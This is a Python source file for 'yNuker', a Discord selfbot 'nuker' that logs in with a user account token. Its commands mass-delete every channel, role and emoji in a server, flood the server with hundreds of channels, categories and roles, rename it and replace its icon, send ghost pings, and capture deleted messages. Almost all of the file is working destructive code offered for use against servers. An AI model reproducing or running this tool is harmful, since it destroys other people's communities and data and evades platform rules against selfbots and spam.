"""MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE."""

import asyncio
import discord
from discord.embeds import Embed
from discord.ext import commands
from os import name as os_name, system
from colorama import init, Fore
from discord.ext.commands import CommandNotFound
import requests
import os 
import json
import sys
import time
import random
import asyncio

TITLE = "yNuker"
VERSION = "0.1"


config = json.load(open("config.json", "r"))
clear = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')


clear()
loading = f'''
{Fore.LIGHTCYAN_EX}
                                   ██╗      █████╗  █████  ██████╗ ██╗███╗  ██╗░██████╗
                                   ██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗ ██║██╔════╝
                                   ██║     ██║  ██║███████║██║  ██║██║██╔██╗██║██║   ██╗
                                   ██║     ██║  ██║██╔══██║██║  ██║██║██║╚████║██   ╚██╗
                                   ███████╗╚█████╔╝██║  ██║██████╔╝██║██║ ╚███║╚██████╔╝██╗██╗██╗
                                   ╚══════╝ ╚════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚══╝ ╚═════╝ ╚═╝╚═╝╚═╝
'''


def banner():
    sys.stdout.buffer.write(f'''\
{Fore.LIGHTRED_EX}
                                ██╗   ██╗███╗  ██╗██╗   ██╗██╗  ██╗███████╗██████╗
                                ╚██╗ ██╔╝████╗ ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗   Version: {Fore.WHITE}{VERSION}{Fore.LIGHTRED_EX}
                                 ╚████╔╝ ██╔██╗██║██║   ██║█████═╝ █████╗  ██████╔╝      Made by: {Fore.WHITE}YeetDisDude#0001{Fore.LIGHTRED_EX}
                                  ╚██╔╝  ██║╚████║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
                                   ██║   ██║ ╚███║╚██████╔╝██║ ╚██╗███████╗██║  ██║
                                   ╚═╝   ╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     
'''.encode('utf8'))

                                       

#json shit
token = config["token"] 
prefix = config["prefix"]
everyoneMsg = config["everyoneMsg"]
chName = config["chName"]
roleName = config["roleName"]
vcName = config["vcName"]
ghostpingmsg = config["ghostpingmsg"]
catName = config["catName"]
serverName = config["serverName"]

#non json config
icon = requests.get("https://cdn.discordapp.com/emojis/914075850998173706.png?size=160").content


clear()
print(loading)


client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)

@client.event
async def on_ready():
    print("                                                      Finished loading.")
    time.sleep(1)
    clear()
    banner()
    print(f'                                                {Fore.RED}yNuker ready.')
    print(f'                                 {Fore.LIGHTRED_EX}Hello, {Fore.LIGHTWHITE_EX}{client.user.name}#{client.user.discriminator}! {Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{client.user.id}')
    print(f'                                        {Fore.LIGHTRED_EX}You are curently in {Fore.WHITE}{len(client.guilds)} {Fore.LIGHTRED_EX}servers.')
    print(f'''
                
                                                     {Fore.LIGHTRED_EX}Commands
                                       {prefix}createAll  |   {prefix}delAll  |  {prefix}createCat
                                      {prefix}createRole  |  {prefix}createVc | {prefix}guildEdit
                                                       {Fore.RED}{prefix}nuke
                                        
                                   {Fore.LIGHTRED_EX}==================Others=================
                                   
                                       {prefix}ping     |   {prefix}snipe   | {prefix}ghostping
                                       {prefix}bitcoin  |   {prefix}
                                       {Fore.WHITE}
                                   ''')                                
cmds = ''

@client.event #ignore command not found error
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        return
    raise error

@client.command()
async def guildEdit(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name=f"{serverName}")
    await ctx.guild.edit(icon=icon)


@client.command()
async def createCat(ctx):
    await ctx.message.delete()
    print(f"- Creating categories. {catName}")
    for i in range(400):
        guild = ctx.guild
        await ctx.guild.create_category(f"{catName}")
        print("Success.")

@client.command()
async def createVc(ctx):
    await ctx.message.delete()
    print(f"- Creating voice channels. {vcName}")
    for i in range(400):
        guild = ctx.guild
        await ctx.guild.create_text_channel(f"{vcName}")
        print("Success.")


async def roles(guild):
  print(f"- Creating roles. {roleName}")
  for x in range(250):
    await guild.create_role(name=f"{roleName}")

async def channels(guild):
  print(f"- Creating channels. {chName}")
  for x in range(500):
    await guild.create_text_channel(f"{chName}")

@client.command()
async def createAll(ctx):
    tasks = [roles(ctx.guild), channels (ctx.guild)]
    await asyncio.gather(*tasks)


@client.command()
async def delAll(ctx):
    await ctx.message.delete()

    print('- Deleting channels')
    try:
      tasks = [x.delete() for x in ctx.guild.channels]
      await asyncio.gather(*tasks)   
    except:
      pass

    print('- Deleting roles..')
    try:
      tasks = [x.delete() for x in ctx.guild.roles]
      await asyncio.gather(*tasks)
    except:
      pass

    print('- Deleting emojis')
    try:
      tasks = [x.delete() for x in ctx.guild.emojis]
      await asyncio.gather(*tasks)
    except:
      pass

    print("I have deleted everything.")

#======================================================others section=================================

@client.command(name="ping")
async def ping(ctx):
    embed=discord.Embed(
         title="Pong!",
         description=(f"{round(client.latency * 1000)}ms."),
         color=0x09c809)
    await ctx.send(embed=embed)

#snipe command
snipe_message_content = None
snipe_message_author = None

@client.event
async def on_message_delete(message):
    global snipe_message_content
    global snipe_message_author


    snipe_message_content = message.content
    snipe_message_author = message.author.name 
    await asyncio.sleep(60)  
    snipe_message_author = None 
    snipe_message_content = None

@client.command()
async def snipe(message):
    if snipe_message_content==None:
        
        await message.channel.send("I can't find anything to snipe.")
    else:
        embed = discord.Embed(description=f"{snipe_message_content}")
        embed.set_footer(text=f"{prefix}snipe sent by {message.author.name}#{message.author.discriminator}")
        embed.set_author(name = f"Message by {snipe_message_author} sniped.")
        await message.channel.send(embed=embed)
        return
#snipe command

@client.command()
async def ghostping(ctx):
    await ctx.message.delete()
    await ctx.send(f'{ghostpingmsg}', delete_after=0)

@client.command(aliases=['bitcoin'])
async def btc(ctx):
    r = requests.get(
        'https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(
        name='Bitcoin',
        icon_url=
        'https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png'
    )
    await ctx.send(embed=em)


client.run(token, bot=False)
